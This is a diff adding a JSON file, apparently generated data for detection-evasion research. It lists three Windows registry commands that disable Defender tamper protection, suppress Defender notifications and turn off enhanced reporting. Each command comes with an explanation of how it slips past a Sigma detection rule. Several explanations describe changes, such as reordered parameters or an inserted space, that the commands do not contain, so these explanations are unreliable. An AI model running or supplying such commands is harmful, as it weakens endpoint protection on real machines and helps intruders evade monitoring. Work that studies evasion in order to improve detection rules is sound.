@@ -1,0 +1,14 @@
+[
+  {
+    "output": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features\" /v \"TamperProtection\" /t REG_DWORD /d 0 /f",
+    "explanation": "Reordering: The command reorders the parameters to avoid matching the Sigma rule's specific string pattern for 'd 0' by using the same command structure but with different parameter placement."
+  },
+  {
+    "output": "reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\UX Configuration /v Notification_Suppress /t REG_DWORD /d 1 /f",
+    "explanation": "Omission: The command omits the quotes around the registry path, which may not trigger the Sigma rule's string matching if it relies on specific formatting."
+  },
+  {
+    "output": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Reporting\" /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f",
+    "explanation": "Insertion: The command inserts an extra space between the registry path and the value name, potentially evading the Sigma rule's exact string matching."
+  }
+]
